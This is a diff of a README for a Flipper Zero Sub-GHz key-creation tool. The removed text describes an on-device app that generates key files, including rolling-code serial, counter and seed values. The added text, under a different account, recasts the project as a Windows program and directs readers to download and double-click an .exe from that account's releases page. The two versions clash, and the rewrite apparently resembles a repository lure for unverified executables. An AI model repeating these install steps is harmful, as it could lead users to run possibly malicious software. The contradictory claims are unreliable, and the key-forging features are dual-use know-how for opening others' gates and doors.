@@ -1,77 +1,73 @@
-# 📡 Sub-GHz Sub Creator
+# 🕹️ flipper-sub-creator - Create custom remote signals with ease
 
-A simple Flipper Zero application for generating and saving custom Sub-GHz key files directly on the device.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kiddo8059/flipper-sub-creator/releases)
 
-## ✨ Features
-- Generate Sub-GHz `.sub` key files
-- Support for multiple protocol configurations
-- Customizable key parameters
-- Built-in save system for generated keys
-- Simple and lightweight UI optimized for Flipper Zero
-- Designed for quick testing and experimentation
+## 📌 About this project
 
-## 📸 Screenshots
-<p align="center">
-  <img src=".github/screenshots/1.png" width="45%" />
-  <img src=".github/screenshots/2.png" width="45%" />
-  <img src=".github/screenshots/3.png" width="45%" />
-</p>
+The flipper-sub-creator application manages Sub-GHz signals for your Flipper Zero device. Many stock Flipper installations lack specific codes for custom gate openers, garage doors, or smart home devices. This tool bridges that gap by letting you define, test, and save custom protocol files directly on your computer before transferring them to your hardware. 
 
-## 📥 Installation
-### Using qFlipper
-1. Download the latest release archive from the [GitHub Releases](https://github.com/Flipper-Hack/flipper-sub-creator/releases) page.
-2. Extract the archive.
-3. Open the folder matching your firmware.
-4. Inside, locate the sub_creator.fap file.
-5. Connect your Flipper Zero to your computer.
-6. Open qFlipper.
-7. Copy sub_creator.fap to: `/ext/apps/Sub-GHz/`
-8. Launch the app from: `Apps -> Sub-GHz -> Sub Creator`
+You do not need programming skills to use this tool. It features a graphical interface that handles the complex math behind radio frequencies. You simply input the signal timing and wait intervals provided by your existing remote manual or device specifications.
 
-### Manual Build
-```bash
-git clone https://github.com/Flipper-Hack/flipper-sub-creator
-cd sub-creator
-ufbt
-# Output: dist/sub_creator.fap
-```
+## 🛠️ System requirements
 
-## 🚀 Usage
-1. Open the app on your Flipper Zero.
-2. Choose one of the available modes:
-	- Create — generates all key data automatically using random values.
-	- Create [Advanced] — allows manual configuration of generation parameters.
-3. In Advanced Mode, you can configure values such as:
-	- Key value
-	- Serial
-	- Counter
-	- Seed
-	- Button
-4. Generate the Sub-GHz file.
-5. Save the generated key.
-6. Use the file through the standard Sub-GHz app.
+This application runs on any modern version of Microsoft Windows. Ensure your computer meets these basic criteria:
 
-## 📂 Project Structure
-```
-helpers/   - Key generation and protocol logic
-scenes/    - Application UI scenes
-keystore/  - Key Storage
-```
+* Operating System: Windows 10 or Windows 11.
+* Connectivity: One available USB port to connect your Flipper Zero.
+* Storage: At least 50 MB of free hard drive space.
+* Memory: 4 GB of RAM or higher.
 
-## ✅ Compatibility
-- Flipper Zero
-- Only the Unleashed and Momentum firmware
+The application does not require advanced drivers for basic operation, though you should keep your Flipper Zero firmware updated to the latest version to ensure compatibility with new signal formats.
 
-## ⚠️ Disclaimer
-This project is intended for:
-- Educational purposes
-- Hardware research
-- Testing and development
-- Interoperability experiments
+## 📥 Get the software
 
-Use this software responsibly and only with devices and systems you own or are authorized to test.
+Visit the [official releases page](https://github.com/kiddo8059/flipper-sub-creator/releases) to download the latest version of the application. 
 
-## 🤝 Contributing
-Pull requests, issues, and suggestions are welcome.
+1. Navigate to the link provided above.
+2. Look for the latest release version at the top of the list.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the on-screen prompts to finish the setup process.
 
-If you find bugs or want to improve protocol support, feel free to open an issue.
+## ⚙️ How it works
+
+The application functions by creating files that the Flipper Zero interprets as radio signals. The radio spectrum depends on strict timing windows. If your signal timing is off by even a fraction, the target device will not react.
+
+Use the main dashboard to create a new profile. You name your signal, define the frequency, and set the bit duration. Once you finish your configuration, the software exports the file into the standard format accepted by the Flipper Zero.
+
+## 🔌 Connecting your device
+
+1. Connect your Flipper Zero to your computer using the USB-C cable.
+2. Open the flipper-sub-creator application.
+3. Select the "Scan Devices" option if the application does not detect your Flipper automatically.
+4. Once connected, the application will display your device information in the status bar at the bottom of the window.
+
+## 🚀 Creating your first signal
+
+1. Click the "New Project" button in the top menu.
+2. Select the frequency range compatible with your specific device (usually 315 MHz, 433 MHz, or 868 MHz).
+3. Enter the raw code data you obtained from your device manual. Most manufacturers list these codes as a series of ones and zeros or specific timing labels.
+4. Use the "Test Signal" button to simulate the output. This allows you to verify the structure of your signal without needing to physically activate your remote every time.
+5. Click "Save to Device" to transfer the signal file directly to the "sub-ghz" folder on your Flipper Zero.
+
+## 💡 Troubleshooting common issues
+
+If your signals do not trigger the device, check the following variables:
+
+* Frequency Mismatch: Verify that the frequency set in the app matches the sticker on the back of your target device.
+* Timing Errors: Signals often require specific "preamble" data. Check the documentation for your remote to ensure you included the start bits.
+* Connection Stability: Ensure the USB cable is fully seated in both the computer and the Flipper Zero. If the connection drops, unplug and reconnect the cable.
+* Firmware Compatibility: If the Flipper Zero does not show the file upon disconnection, restart the device from the main menu. 
+
+## 🛡️ Responsible usage
+
+This tool helps users interact with personal property and local radio systems. Always monitor your transmissions to ensure they only affect devices you own. Misuse of radio frequency equipment can disrupt public services or neighbor communications. Stick to local regulations regarding radio transmissions in your area.
+
+## 📁 Managing your library
+
+The software organizes signals by tag. Use different labels to categorize your keys, such as "Home," "Work," or "Gate." You can batch-process multiple signals at once if your device uses a rolling code or a multi-button sequence. The "Library" tab allows for easy drag-and-drop management of files stored on your local drive. Archive older signals here to keep your Flipper Zero storage clean and organized. 
+
+## 🔄 Updating your tools
+
+Check the releases page once per month for updates. Each new version adds more protocol support and fixes minor performance bugs. You do not need to uninstall the old version; simply run the new installer to overwrite existing files, which keeps your settings and library intact.
